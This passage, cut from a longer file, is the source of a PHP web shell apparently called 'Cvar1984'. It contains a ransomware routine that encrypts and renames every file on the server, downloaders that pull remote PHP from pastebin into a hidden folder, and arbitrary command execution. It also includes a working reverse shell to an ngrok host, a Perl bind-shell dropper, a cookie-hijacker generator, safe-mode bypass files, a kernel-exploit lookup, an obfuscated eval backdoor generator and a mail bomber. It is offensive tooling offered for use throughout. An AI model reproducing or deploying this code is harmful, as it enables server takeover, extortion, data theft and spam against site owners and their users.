MZQVKFtQelA+R95z9NyCmofa8LWhPILSgfIYyo8foXKL7iyGb2jqe7V9CwoCIQ41QTreoSX/aoh69ZqV/SiDPLduqWutrHTk7x+K48DSv8JEid/33EYza14utFUVNKSKXquq+mWxIct4NMjGNWT9sthQ5ZDAfcxzDy3U4ZT0kazCWZFy4YH8XjIAk/csFFBAGoq8xh6YHHj1Jgzs0tHQq9dV7TKrjnKCzGqv3tCd00Ygv3Kj8+r7lhxyYCkY9uqHlmJqVK3Q9Vy3ZoU1KOpWWIeiYYUNKJpW2IRizwr3oNi3wn0oDqzwAIpDKzz03JocXoXShRLk1ECOC4Jq9TvrEwYUieRnID+x/CTyM5Sfz/LD4QOp5gsevaETiDpgqpoW5FWPhUKTooxEoowwzAgDKoimcElpTfEohS2hj8Pz9MJK22F2SG6lsDMgqQnyrA9pJ38mgnWVreNyt1KRVlZNDynVM+onTQXtM1qiadKAGfGzIrrtfqbwmJ33L/J0AgbPtzMIPZ7Wit1USpKVnsLMOR9QLImWZFHMCky6GOeTK5VijAelUoTxp1JpiHFSKnGMP8PQDqCf9cy3p3hvZtgCm4LtE/kD2ItRBzAQzAen6r6/kWhE5QKBFbAbvs/GApZKPF6kleVqDLmC1Zc0JKNIwP3ago3CEj2W2nPb1Dm5wDc+kGQCenS6zVhqODhJ7gB3cr2D4JUk/chSQeH2enyfVNbcFgVdJkAiEYL4PcVyPNcqoyRGlZwbWM8LhAsM+jiVJ4zC5pntBPf3lQ5eOqmWztjtreW9sF6dqciO3oIsH2rZDtiBau6VFuxLdDaTuZaeCWztJrhKGz3vpaVUdRaQPvL1xGENYHXu7qzcRunaMjqF7Kj8jKypF8wbWGkbMEytsz33R7Xj8RhClITJSP5aiu7k+d1xLi6O5BV+8YjTduSvHFBrO+rPev8L")))) {
                    echo '<i class="fa fa-thumbs-o-up" aria-hidden="true"></i>  index.php (Default Page)<br>';
                }
            }
        }
        public function shcpackUnstall() {
            if(file_exists(".htabak")) {
                if(unlink(".htaccess") && unlink("index.php")) {
                    echo '<i class="fa fa-thumbs-o-down" aria-hidden="true"></i> .htaccess (Default Page)<br>';
                    echo '<i class="fa fa-thumbs-o-down" aria-hidden="true"></i> index.php (Default Page)<br>';
                }
                rename(".htabak", ".htaccess");
            }
        }
        public function plus() {
            flush();
            ob_flush();
        }
        public function locate() {
            return getcwd();
        }
        public function shcdirs($dir, $method, $key) {
            switch($method) {
                case '1':
                    deRanSomeware::shcpackInstall();
                    break;
                case '2':
                    deRanSomeware::shcpackUnstall();
                    break;
            }
            foreach(scandir($dir) as $d) {
                if($d != '.' && $d != '..') {
                    $locate = $dir . DIRECTORY_SEPARATOR . $d;
                    if(!is_dir($locate)) {
                        if(deRanSomeware::kecuali($locate, "ini.php") && deRanSomeware::kecuali($locate, ".png") && deRanSomeware::kecuali($locate, ".htaccess") && deRanSomeware::kecuali($locate, "ini.php") && deRanSomeware::kecuali($locate, "index.php") && deRanSomeware::kecuali($locate, ".htabak")) {
                            switch($method) {
                                case '1':
                                    deRanSomeware::shcEnCry($key, $locate);
                                    deRanSomeware::shcEnDesDirS($locate, "1");
                                    break;
                                case '2':
                                    deRanSomeware::shcDeCry($key, $locate);
                                    deRanSomeware::shcEnDesDirS($locate, "2");
                                    break;
                            }
                        }
                    } else {
                        deRanSomeware::shcdirs($locate, $method, $key);
                    }
                }
                deRanSomeware::plus();
            }
        }
        public function shcEnDesDirS($locate, $method) {
            switch($method) {
                case '1':
                    rename($locate, $locate . ".bak");
                    break;
                case '2':
                    $locates = str_replace(".bak", "", $locate);
                    rename($locate, $locates);
                    break;
            }
        }
        public function shcEnCry($key, $locate) {
            $data      = file_get_contents($locate);
            $iv        = mcrypt_create_iv(mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC), MCRYPT_DEV_URANDOM);
            $encrypted = base64_encode($iv . mcrypt_encrypt(MCRYPT_RIJNDAEL_128, hash('sha256', $key, true), $data, MCRYPT_MODE_CBC, $iv));
            if(file_put_contents($locate, $encrypted)) {
                echo '<i class="fa fa-lock" aria-hidden="true"></i> <font color="#00BCD4">Locked</font> (<font color="#40CE08">Success</font>) <font color="#FF9800">|</font> <font color="#2196F3">' . $locate . '</font> <br>';
            } else {
                echo '<i class="fa fa-lock" aria-hidden="true"></i> <font color="#00BCD4">Locked</font> (<font color="red">Failed</font>) <font color="#FF9800">|</font> ' . $locate . ' <br>';
            }
        }
        public function shcDeCry($key, $locate) {
            $data      = base64_decode(file_get_contents($locate));
            $iv        = substr($data, 0, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC));
            $decrypted = rtrim(mcrypt_decrypt(MCRYPT_RIJNDAEL_128, hash('sha256', $key, true), substr($data, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC)), MCRYPT_MODE_CBC, $iv), "\0");
            if(file_put_contents($locate, $decrypted)) {
                echo '<i class="fa fa-unlock" aria-hidden="true"></i> <font color="#FFEB3B">Unlock</font> (<font color="#40CE08">Success</font>) <font color="#FF9800">|</font> <font color="#2196F3">' . $locate . '</font> <br>';
            } else {
                echo '<i class="fa fa-unlock" aria-hidden="true"></i> <font color="#FFEB3B">Unlock</font> (<font color="red">Failed</font>) <font color="#FF9800">|</font> <font color="#2196F3">' . $locate . '</font> <br>';
            }
        }
        public function kecuali($ext, $name) {
            $re = "/({$name})/";
            preg_match($re, $ext, $matches);
            if($matches[1]) {
                return false;
            }
            return true;
        }
    }
    if($_POST['submit']) {
        switch($_POST['method']) {
            case '1':
                deRanSomeware::shcdirs(deRanSomeware::locate(), "1", $_POST['key']);
                break;
            case '2':
                deRanSomeware::shcdirs(deRanSomeware::locate(), "2", $_POST['key']);
                break;
        }
    } else {
        echo "
<form action='' method='post' style='text-align: center;'>
<label>Key : </label>
<input type='text' name='key' class='inpute' placeholder='KEY ENC/DEC'>
<select name='method' class='selecte'>
         <option value='1'>Infection</option>
         <option value='2'>DeInfection</option>
      </select>
      <input type='submit' name='submit' class='submite' value='Submit'/>
</form>";
    }
    echo "
</div>
</body>";
}
function idxshell() {
    if(!file_exists('.config')) {
        mkdir('.config', 0755);
    }
    $nama = fopen(".config/idx.php", "w");
    $file = file_get_contents('https://pastebin.com/raw/5UQAgFsp');
    fwrite($nama, $file);
    chmod($nama, 0444);
    fclose($nama);
}
function adminer() {
    if(!file_exists('.config')) {
        mkdir('.config', 0755);
    }
    $nama = fopen(".config/adminer.php", "w+");
    $file = file_get_contents('https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php');
    fwrite($nama, $file);
    fclose($nama);
}
function jembud2() {
    if(!file_exists('.config')) {
        mkdir('.config', 0755);
    }
    $nama = fopen(".config/jembud2.php", "w+");
    $file = file_get_contents('https://pastebin.com/raw/nCqVmtBu');
    fwrite($nama, $file);
    chmod($nama, 0444);
    fclose($nama);
}
function ngindex() {
    $nama = fopen("Cvar1984.php", "w+");
    $file = file_get_contents('https://pastebin.com/raw/LVGSGa1m');
    fwrite($nama, $file);
    chmod($nama, 0444);
    fclose($nama);
}
function filemanager_bg() {
    global $sep, $self;
    $path = !empty($_GET['path']) ? $_GET['path'] : getcwd();
    $dirs = array();
    $fils = array();
    if(is_dir($path)) {
        chdir($path);
        if($handle = opendir($path)) {
            while(($item = readdir($handle)) !== FALSE) {
                if($item == ".") {
                    continue;
                }
                if($item == "..") {
                    continue;
                }
                if(is_dir($item)) {
                    array_push($dirs, $path . $sep . $item);
                } else {
                    array_push($fils, $path . $sep . $item);
                }
            }
        } else {
            alert("Access Denied for this operation");
        }
    } else {
        alert("Directory Not Found!!!");
    }
    echo "
<div id=result>
<table class=table>
    <tr>
    <th width='500px'>Name</th>
    <th width='100px'>Size</th>
    <th width='100px'>Permissions</th>
    <th width='500px'>Actions</th>
    </tr>";
    foreach($dirs as $dir) {
        echo "<tr><td><a href='{$self}?path={$dir}'>" . basename($dir) . "</a></td>
<td>" . filesize_x($dir) . "</td>
<td><a href='{$self}?path={$path}&amp;perm={$dir}'>" . file_perm($dir) . "</a></td>
<td><a href='{$self}?path={$path}&amp;del_dir={$dir}'>Delete</a> |
<a href='{$self}?path={$path}&amp;rename={$dir}'>Rename</a>
| <a href='{$self}?zip={$dir}'> Download </a></td></tr>";
    }
    foreach($fils as $fil) {
        echo "<tr><td><a href='{$self}?path={$path}&amp;read={$fil}'>" . basename($fil) . "</a></td>
              <td>" . filesize_x($fil) . "</td>
              <td><a href='{$self}?path={$path}&amp;perm={$fil}'>" . file_perm($fil) . "</a></td>
              <td><a href='{$self}?path={$path}&amp;del_fil={$fil}'>Delete</a> |
<a href='{$self}?path={$path}&amp;rename={$fil}'>Rename</a>
| <a href='{$self}?path={$path}&amp;edit={$fil}'>Edit</a>
|
<a href='{$self}?path={$path}&amp;copy={$fil}'>Copy</a> |
<a href='{$self}?zip={$fil}'> Download </a> 
</td>";
    }
    echo "</tr></table></div>";
}
function rename_bg() {
    if(isset($_GET['old_name']) && isset($_GET['new_name'])) {
        $o_r_path   = basename($_GET['old_name']);
        $r_path     = str_replace($o_r_path, "", $_GET['old_name']);
        $r_new_name = $r_path . $_GET['new_name'];
        echo $r_new_name;
        if(rename($_GET['old_name'], $r_new_name) == FALSE) {
            alert("Access Denied for this action!!!");
        } else {
            alert("Renamed File Succeessfully");
        }
    }
}
function edit_file() {
    $path = $_GET['path'];
    chdir($path);
    $edt_file  = $_GET['edit'];
    $e_content = wordwrap(htmlspecialchars(file_get_contents($edt_file)));
    if($e_content) {
        $o_content = $e_content;
    } else if(function_exists('fgets') && function_exists('fopen') && function_exists('feof')) {
        $fd = fopen($edt_file, "rb");
        if(!$fd) {
            alert("Permission Denied");
        } else {
            while(!feof($fd)) {
                $o_content = wordwrap(htmlspecialchars(fgets($fd)));
            }
        }
        fclose($fd);
    }
    echo "<div id='result'>
    <center><h2>Edit File</h2><hr></center><br>
	<font color=red>View File</font> : <font color=yellow><a style='text-decoration:none; color:yellow;' href='?read=" . $_GET['edit'] . "'>" . basename($_GET['edit']) . "</a><br /><br /><hr><br></font>
<form method='POST'><input type='hidden' name='e_file' value=" . $_GET['edit'] . ">
          <center><textarea spellcheck='false' class='textarea_edit' name='e_content_n' cols='80' rows='25'>" . $o_content . "</textarea></center>
		  <hr>
          <input class='input_big' name='save' type='submit' value='O' ><br><br><hr><br><br></div>";
}
function edit_file_bg() {
    if(file_exists($_POST['e_file'])) {
        $handle = fopen($_POST['e_file'], "w+");
        if(!handle) {
            alert("Permission Denied");
        } else {
            fwrite($handle, $_POST['e_content_n']);
            alert("Your changes were Successfully Saved!");
        }
        fclose($handle);
    } else {
        alert("File Not Found!!!");
    }
}
function delete_file() {
    $del_file = $_GET['del_fil'];
    if(unlink($del_file) != FALSE) {
        alert("Deleted Successfully");
        exit;
    } else {
        alert("Access Denied for this Operation");
        exit;
    }
}
function deldirs($d_dir) {
    $d_files = glob($d_dir . '*', GLOB_MARK);
    foreach($d_files as $d_file) {
        if(is_dir($d_file)) {
            deldirs($d_file);
        } else {
            unlink($d_file);
        }
    }
    if(is_dir($d_dir)) {
        if(rmdir($d_dir)) {
            alert("Deleted Directory Successfully");
        } else {
            alert("Access Denied for this Operation");
        }
    }
}
function code_viewer() {
    $path      = $_GET['path'];
    $r_file    = $_GET['read'];
    $r_content = wordwrap(htmlspecialchars(file_get_contents($r_file)));
    if($r_content) {
        $rr_content = $r_content;
    } else if(function_exists('fgets') && function_exists('fopen') && function_exists('feof')) {
        $fd = fopen($r_file, "rb");
        if(!$fd) {
            alert("Permission Denied");
        } else {
            while(!feof($fd)) {
                $rr_content = wordwrap(htmlspecialchars(fgets($fd)));
            }
        }
        fclose($fd);
    }
    echo "<div id=result><center><h2>View File</h2></center><hr><br>
<font color=red>Edit File</font><font color=yellow> : </font>
<font color=#999><a style='text-decoration:none; color:yellow;' href='?path={$path}&amp;edit=" . $_GET['read'] . "'>" . basename($_GET['read']) . "</a></font><br><br><hr><pre><code>" . $rr_content . "</code></pre>
<br><br><hr><br><br></div>";
}
function copy_file_ui() {
    echo "<div id=result><center><h2>Copy File</h2><hr /><br /><br /><table class=table><form method='GET'><tr><td style='text-align:center;'>Copy : <input size=40 name='c_file' value=" . $_GET['copy'] . " > To : <input size=40
name='c_target' value=" . $_GET['path'] . $sep . "> Name :
<input name='cn_name'><input type='submit' value=' O'></form></table><br><br><hr><br><br><br></center></div>";
}
function copy_file_bg() {
    global $sep;
    if(function_exists(copy)) {
        if(copy($_GET['c_file'], $_GET['c_target'] . $sep . $_GET['cn_name'])) {
            alert("Succeded");
        } else {
            alert("Access Denied");
        }
    }
}
function ch_perm_bg() {
    if(isset($_GET['p_filex']) && isset($_GET['new_perm'])) {
        if(chmod($_GET['p_filex'], $_GET['new_perm']) != FALSE) {
            alert("Succeded. Permission Changed!!!");
        } else {
            alert("Access Denied for This Operation");
        }
    }
}
function ch_perm_ui() {
    $p_file = $_GET['perm'];
    echo "<div id =result>
    <center><h2>New Permission</h2><hr /><p>
    <form method
    '>
    <input type='hidden' name='path' value=" . getcwd() . " ><input name='p_filex' type=hidden
value={$p_file} >New Permission : <input name='new_perm' isze='40'
value=0" . substr(sprintf('%o', fileperms($p_file)), -3) . "><input type='submit' value=' O'
/></form></p><p>Full Access : <font
color=red>755</font><br />Notice : <font
color=red>Don't use Unix Access like 777, 666, etc. Use 755, 655,
etc</p><br /><br /><hr /><br /><br
/></center></div>";
    ch_perm_bg();
}
function mk_file_ui() {
    chdir($_GET['path']);
    echo "<div id=result><br><br><font color=red><form method='GET'>
          <input type='hidden' name='path' value=" . getcwd() . ">
          New File Name : <input size='40' name='new_f_name'
value=" . $_GET['new_file'] . "></font><br><br><hr><br><center>
          <textarea spellcheck='false' cols='80' rows='25' class=textarea_edit name='n_file_content'></textarea></center><hr>
          <input class='input_big' type='submit' value='O'></form></center></div>";
}
function mk_file_bg() {
    chdir($_GET['path']);
    $c_path          = $_GET['path'];
    $c_file          = $_GET['new_f_name'];
    $c_file_contents = $_GET['n_file_content'];
    $handle          = fopen($c_file, "w");
    if(!$handle) {
        alert("Permission Denied");
    } else {
        fwrite($handle, $c_file_contents);
        alert("Your changes were Successfully Saved!");
    }
    fclose($handle);
}
function create_dir() {
    chdir($_GET['path']);
    $new_dir = $_GET['new_dir'];
    if(is_writable($_GET['path'])) {
        mkdir($new_dir);
        alert("Direcory Created Successfully");
        exit;
    } else {
        alert("Access Denied for this Operation");
        exit;
    }
}
function cmd($cmd) {
    chdir($_GET['path']);
    $res = "";
    if($_GET['cmdexe']) {
        $cmd = $_GET['cmdexe'];
    }
    if(function_exists('shell_exec')) {
        $res = shell_exec($cmd);
    } else if(function_exists('exec')) {
        exec($cmd, $res);
        $res = join("\n", $res);
    } else if(function_exists('system')) {
        ob_start();
        system($cmd);
        $res = ob_get_contents();
        ob_end_clean();
    } elseif(function_exists('passthru')) {
        ob_start();
        passthru($cmd);
        $res = ob_get_contents();
        ob_end_clean();
    } else if(function_exists('proc_open')) {
        $descriptorspec = array(
            0 => array(
                "pipe",
                "r"
            ),
            1 => array(
                "pipe",
                "w"
            ),
            2 => array(
                "pipe",
                "w"
            )
        );
        $handle         = proc_open($cmd, $descriptorspec, $pipes);
        if(is_resource($handle)) {
            if(function_exists('fread') && function_exists('feof')) {
                while(!feof($pipes[1])) {
                    $res .= fread($pipes[1], 512);
                }
            } else if(function_exists('fgets') && function_exists('feof')) {
                while(!feof($pipes[1])) {
                    $res .= fgets($pipes[1], 512);
                }
            }
        }
        pclose($handle);
    } else if(function_exists('popen')) {
        $handle = popen($cmd, "r");
        if(is_resource($handle)) {
            if(function_exists('fread') && function_exists('feof')) {
                while(!feof($handle)) {
                    $res .= fread($handle, 512);
                }
            } else if(function_exists('fgets') && function_exists('feof')) {
                while(!feof($handle)) {
                    $res .= fgets($handle, 512);
                }
            }
        }
        pclose($handle);
    }
    $res = wordwrap(htmlspecialchars($res));
    if($_GET['cmdexe']) {
        echo "<div id=result><center><font
color=yellow><h2>root@Cvar1984:~#</h2></center><hr><pre>" . $res . "</font></pre></div>";
    }
    return $res;
}
function upload_file() {
    chdir($_POST['path']);
    if(move_uploaded_file($_FILES['upload_f']['tmp_name'], $_FILES['upload_f']['name'])) {
        alert("Uploaded File Successfully");
    } else {
        alert("Access Denied!!!");
    }
}
function reverse_conn_ui() {
    global $your_ip;
    echo "<div id='result'>
          <center><h2>Reverse Shell</h2><hr>
          <br><br><form method='GET'>
		  <table class=tbl>
          <tr>
          <td>Your IP : <input name='my_ip' value='0.tcp.ngrok.io'>
   <br>
          PORT : <input name='my_port' value='40141'>
          <input type='submit' value='O'></td></tr>
		  <select name='rev_option' style='color:yellow;background-color:black;border:1px solid #666;'>
<option>PHP Reverse Shell</option>
<option>PERL Bind Shell</option>
</select></form>
          <tr><td>
		  <font color=red>PHP Reverse Shell</font> : <font color=yellow> nc -lvp
<i>port</i></font></td></tr><tr><td><font
color=red>PERL Bind Shell</font> : <font color=yellow> nc
<i>server_ip port</i></font></td></tr></table></div>";
}
function reverse_conn_bg() {
    global $os;
    $option = $_REQUEST['rev_option'];
    $ip     = $_GET['my_ip'];
    $port   = $_GET['my_port'];
    if($option == "PHP Reverse Shell") {
        echo "<div id=result><h2>RESULT<h2><hr><br>";
        function printit($string) {
            if(!$daemon) {
                print "$string\n";
            }
        }
        $chunk_size = 1400;
        $write_a    = null;
        $error_a    = null;
        $shell      = 'uname -a; w; id; /bin/sh -i';
        $daemon     = 0;
        $debug      = 0;
        if(function_exists('pcntl_fork')) {
            $pid = pcntl_fork();
            if($pid == -1) {
                printit("ERROR: Can't fork");
                exit(1);
            }
            if($pid) {
                exit(0);
            }
            if(posix_setsid() == -1) {
                printit("Error: Can't setsid()");
                exit(1);
            }
            $daemon = 1;
        } else {
            printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
        }
        chdir("/");
        umask(0);
        $sock = fsockopen($ip, $port, $errno, $errstr, 30);
        if(!$sock) {
            printit("$errstr ($errno)");
            exit(1);
        }
        $descriptorspec = array(
            0 => array(
                "pipe",
                "r"
            ),
            1 => array(
                "pipe",
                "w"
            ),
            2 => array(
                "pipe",
                "w"
            )
        );
        $process        = proc_open($shell, $descriptorspec, $pipes);
        if(!is_resource($process)) {
            printit("ERROR: Can't spawn shell");
            exit(1);
        }
        stream_set_blocking($pipes[0], 0);
        stream_set_blocking($pipes[1], 0);
        stream_set_blocking($pipes[2], 0);
        stream_set_blocking($sock, 0);
        printit("<font color=yellow>Successfully opened reverse shell to $ip:$port </font>");
        while(1) {
            if(feof($sock)) {
                printit("ERROR: Shell connection terminated");
                break;
            }
            if(feof($pipes[1])) {
                printit("ERROR: Shell process terminated");
                break;
            }
            $read_a              = array(
                $sock,
                $pipes[1],
                $pipes[2]
            );
            $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
            if(in_array($sock, $read_a)) {
                if($debug)
                    printit("SOCK READ");
                $input = fread($sock, $chunk_size);
                if($debug)
                    printit("SOCK: $input");
                fwrite($pipes[0], $input);
            }
            if(in_array($pipes[1], $read_a)) {
                if($debug)
                    printit("STDOUT READ");
                $input = fread($pipes[1], $chunk_size);
                if($debug)
                    printit("STDOUT: $input");
                fwrite($sock, $input);
            }
            if(in_array($pipes[2], $read_a)) {
                if($debug)
                    printit("STDERR READ");
                $input = fread($pipes[2], $chunk_size);
                if($debug)
                    printit("STDERR: $input");
                fwrite($sock, $input);
            }
        }
        fclose($sock);
        fclose($pipes[0]);
        fclose($pipes[1]);
        fclose($pipes[2]);
        proc_close($process);
        echo "<br><br><hr><br><br></div>";
    } else if($option == "PERL Bind Shell") {
        global $bind_perl, $os;
        $pbfl   = $bind_perl;
        $handlr = fopen("back.pl", "wb");
        if($handlr) {
            fwrite($handlr, gzinflate(base64_decode($bind_perl)));
        } else {
            alert("Access Denied for create new file");
        }
        fclose($handlr);
        if(file_exists("back.pl")) {
            if($os == "nix") {
                cmd("chmod +x back.pl;perl back.pl $port");
            } else {
                cmd("perl back.pl $port");
            }
        }
    }
}
function cookie_jack() {
    global $cookie_highjacker;
    echo "<div id=result><center><h2>NOTICE</h2><hr/>";
    if(function_exists('fopen') && function_exists('fwrite')) {
        $cook   = gzinflate(base64_decode($cookie_highjacker));
        $han_le = fopen("404.php", "w+");
        if($han_le) {
            fwrite($han_le, $cook);
            echo "Yes... Cookie highjacker is generated<br> Name : <a style='color:yellow;' target=_blank
href=404.php>404.php</a></font>.<br
/>It is usefull in XSS<br />It will make a file
<font color=red>configuration.txt</font> in this direcory and
save the cookie value in it. :p cheers...<br /><br /><hr
/><br /><br /></center></div>";
        } else {
            echo "<font color=red>Sorry... Generate COOKIE
HIGHJACKER failed<br /><br /><hr /><br /><br
/></center></div>";
        }
    }
}
function safe_mode_fuck() {
    global $s_php_ini, $s_htaccess, $s_htaccess_pl, $ini_php;
    $path = chdir($_GET['path']);
    chdir($_GET['path']);
    switch($_GET['safe_mode']) {
        case "s_php_ini":
            $s_file = $s_php_ini;
            $s_name = "php.ini";
            break;
        case "s_htaccess":
            $s_name = ".htaccess";
            $s_file = $s_htaccess;
            break;
        case "s_htaccess_pl":
            $s_name = ".htaccess";
            $s_file = $s_htaccess_pl;
            break;
        case "s_ini_php":
            $s_name = "ini.php";
            $s_file = $ini_php;
            break;
    }
    if(function_exists('fopen') && function_exists('fwrite')) {
        $s_handle = fopen("$s_name", "w+");
        if($s_handle) {
            fwrite($s_handle, $s_file);
            alert("Operation Succeed!!!");
        } else {
            alert("Access Denied!!!");
        }
        fclose($s_handle);
    }
}
function ceklog() {
echo "
<style>
hr{color:silver;}
</style>
<pre>";
error_reporting(0);
class jalanin {
public function cuk($patch) {
foreach(scandir($patch) as $d) {
if($d!='.' && $d!='..') {
$d = $patch.DIRECTORY_SEPARATOR.$d;
if(!is_dir($d)) {
jalanin::cek($d);
} else {
jalanin::cuk($d);
} 
}
}
}
public function cek($patch){
$exif="/exif_read_data/";
preg_match($exif,file_get_contents(addslashes($patch)), $match);
if($match[0]) {
echo "<font color='yellow'>[EXECUTION FILE] ".$patch."</font><br><hr>";
} else if(exif_read_data($patch)) {
echo "<font color='red'>[LOGGER DETECTED] ".$patch."</font><br><hr>";
} else {
echo "<font color='lime'>[FILE SAFE] ".$patch."</font><br><hr>";
}
}
}
jalanin::cuk(getcwd());
}
function safe_mode_fuck_ui() {
    global $path;
    $path = getcwd();
    echo "<div id=result><br>
	<center><h2>Select Your Options</h2>
	<hr>
    <table class=tbl size=10><tr><td><a href=?path={$path}&amp;safe_mode=s_php_ini>php.ini</a></td>
	<td><a href=?path={$path}&amp;safe_mode=s_htaccess>.htaccess</a></td>
	<td><a href=?path={$path}&amp;safe_mode=s_htaccess_pl>.htacces (perl)</td>
	<td><a href=?path={$path}&amp;safe_mode=s_ini_php>ini.php</td></tr></table><br><br></div>";
}
function AccessDenied() {
    global $path, $forbid_dir;
    $path = $_GET['path'];
    chdir($path);
    if(function_exists('fopen') && function_exists('fwrite')) {
        $forbid = fopen(".htaccess", "wb");
        if($forbid) {
            fwrite($forbid, $forbid_dir);
            alert("Opreation Succeeded");
        } else {
            alert("Access Denied");
        }
        fclose($forbid);
    }
}
function r00t_exploit() {
    $kernel  = php_uname();
    $r00t_db = array(
        '2.6.19' => 'jessica',
        '2.6.20' => 'jessica',
        '2.6.21' => 'jessica',
        '2.6.22' => 'jessica',
        '2.6.23' => 'jessica,vmsplice',
        '2.6.24' => 'jessica,vmspice',
        '2.6.31' => 'enlightment',
        '2.6.18' => 'brk,ptrace,kmod,brk2',
        '2.6.17' => 'prctl3,raptor_prctl,py2',
        '2.6.16' => 'raptor_prctl,exp.sh,raptor,raptor2,h00lyshit',
        '2.6.15' => 'py2,exp.sh,raptor,raptor2,h00lyshit',
        '2.6.14' => 'raptor,raptor2,h00lyshit',
        '2.6.13' => 'kdump,local26,py2,raptor_prctl,exp.sh,prctl3,h00lyshit',
        '2.6.12' => 'h00lyshit',
        '2.6.11' => 'krad3, krad,h00lyshit',
        '2.6.10' => 'h00lyshit,stackgrow2,uselib24,exp.sh,krad,krad2',
        '2.6.9' => 'exp.sh,krad3,py2, prctl3,h00lyshit',
        '2.6.8' => 'h00lyshit, krad, krad2',
        '2.6.7' => 'h00lyshit,krad,krad2',
        '2.6.6' => 'h00lyshit,krad,krad2',
        '2.6.2' => 'h00lyshit,krad,mremap_pte',
        '2.6.' => 'prctl,kmdx,newsmp,pwned,ptrace_kmod,ong_bak',
        '2.4.29' => 'elflbl,expand_stack,stackgrow2,uselib24,smpracer',
        '2.4.27' => 'elfdump,uselib24',
        '2.4.25' => 'uselib24',
        '2.4.24' => 'mremap_pte,loko,uselib24',
        '2.4.23' => 'mremap_pte,loko,uselib24',
        '2.4.22' => 'loginx,brk,km2,loko,ptrace,uselib24,brk2,ptrace-kmod',
        '2.4.21' => 'w00t,brk,uselib24,loginx,brk2,ptrace-kmod',
        '2.4.20' => 'mremap_pte, w00t,brk,ave,uselib24,loginx,ptrace-kmod,ptrace,kmod',
        '2.4.19' => 'newlocal,w00t,ave,uselib24,loginx,kmod',
        '2.4.18' => 'km2, w00t,uselib24,loginx,kmod',
        '2.4.17' => 'newlocal,w00t,uselib24,loginx,kmod',
        '2.4.16' => 'w00t,uselib24,loginx',
        '2.4.10' => 'w00t,brk,uselib24,loginx',
        '2.4.9' => 'ptrace24,uselib24',
        '2.4.' => 'kmdx,remap,pwned,ptrace_kmod,ong_bak',
        '2.2.25' => 'mremap_pte',
        '2.2.24' => 'ptrace',
        '2.2.' => 'rip,ptrace'
    );
    foreach($r00t_db as $kern => $exp) {
        if(strstr($kernel, $kern)) {
            return $exp;
        } else {
            $exp = '<font color="red">Not found.</font>';
            return $exp;
        }
    }
}
function php_ende_ui() {
    echo "
<div id=result><center><h2>PHP ENCODE/DECODE</h2></center><hr><form method='post'>
	<table class=tbl>
    <tr><td>
    Method : <select name='typed' style='color:yellow;background-color:black;border:1px solid#666;'>
	<option>Encode</option>
	<option>Decode</decode>
	</select>
TYPE : <select name='typenc' style='color:yellow;background-color:black;border:1px solid #666;'>
<option>GZINFLATE</option>
<option>GZUNCOMPRESS</option>
<option>STR_ROT13</option>
</tr></td><tr>
<td><textarea spellcheck='false' class=textarea_edit cols='80' rows='25' name='php_content'></textarea></tr></td></table><hr>
<input class='input_big' type='submit' value='O'><br><hr><br><br></form></div>";
}
function php_ende_bg() {
    $meth_d  = $_POST['typed'];
    $typ_d   = $_POST['typenc'];
    $c_ntent = $_POST['php_content'];
    $c_ntent = $c_ntent;
    switch($meth_d) {
        case "Encode":
            switch($typ_d) {
                case "GZINFLATE":
                    $res_t = base64_encode(gzdeflate(trim(stripslashes($c_ntent . ' '), '<?php,
?>'), 9));
                    $res_t = "<?php 
					eval(gzinflate(base64_decode(\"$res_t\")));
?>";
                    break;
                case "GZUNCOMPRESS":
                    $res_t = base64_encode(gzcompress(trim(stripslashes($c_ntent . ' '), '<?php,
?>'), 9));
                    $res_t = "<?php  eval(gzuncompress(base64_decode(\"$res_t\")));
?>";
                    break;
                case "STR_ROT13":
                    $res_t = trim(stripslashes($c_ntent . ' '), '<?php,
?>');
                    $res_t = base64_encode(str_rot13($res_t));
                    $res_t = "<?php  eval(str_rot13(base64_decode(\"$res_t\")));
?>";
                    break;
            }
            break;
        case "Decode":
            switch($typ_d) {
                case "GZINFLATE":
                    $res_t = gzinflate(base64_decode($c_ntent));
                    break;
                case "GZUNCOMPRESS":
                    $res_t = gzuncompress(base64_decode($c_ntent));
                    break;
                case "STR_ROT13":
                    $res_t = str_rot13(base64_decode($c_ntent));
                    break;
            }
            break;
    }
    echo "<div id=result><center><h2>Cvar1984 Hidden Backdoor</h2>
	<hr><textarea spellcheck='false' class=textarea_edit cols='80' rows='25'>" . htmlspecialchars($res_t) . "</textarea></center></div>";
}
function massmailer_ui() {
    echo "<div id=result><center><h2>MASS MAILER & MAIL BOMBER</h2><hr>
	<table class=tbl width=40 style='col-width:40'>
	<td><table class=tbl><tr style='float:left;'>
	<td><font color=yellow size=4>Mass Mail</font></td></tr>
	<form method='POST'><tr style='float:left;'>
	<td> FROM : </td>
	<td><input name='from' size=40 value='admin'></td></tr><tr style='float:left;'>
	<td>TO : </td><td><input size=40 name='to_mail' value='gedzsarjuncomuniti@gmail,gedzsarjuncomuniti@yahoo.co.id'></td></tr>
	<tr style='float:left;'>
	<td>Subject : </td><td><input size=40 name='subject_mail' value='Testing,'></td></tr>
	<tr style='float:left;'>
	<td><textarea spellcheck='false' class=textarea_edit cols='34' rows='10' name='mail_content'>I'm doing
massmail :p</textarea></td>
<td><input class='input_big' type='submit' value=O></td></tr></form></table></td>
<form method='post'>
<td> <table class='tbl'>
<td><font color=yellow size=4>Mail Bomber</font></td></tr>
<tr style='float:left;'><td>TO : </td>
<td><input size='40' name='bomb_to' value='gedzsarjuncomuniti@gmail.com,gedzsarjuncomuniti@yahoo.com'></td></tr><tr style='float:left;'>
<td>Subject : </td>
<td><input size='40' name='bomb_subject' value='Bombing with messages'></td></tr><tr style='float:left;'>
<td>No. of times</td><td><input size='40' name='bomb_no' value='100'></td></tr><tr style='float:left;'>
<td><textarea spellcheck='false' class=textarea_edit cols='34' rows='10' name='bmail_content' required>I'm doing E-Mail Bombing :p</textarea></td>
<td><input class='input_big' type='submit' value='O'></td></tr></form></table>  
</td></tr></table>";
}
function massmailer_bg() {
    $from    = $_POST['from'];
    $to      = $_POST['to_mail'];
    $subject = $_POST['subject_mail'];
    $message = $_POST['mail_content'];
    if(function_exists('mail')) {
        if(mail($to, $subject, $message, "From:$from")) {
            echo "<div id=result><center><h2>MAIL
SPAMER</h2><hr /><br /><br /><font color=yellow
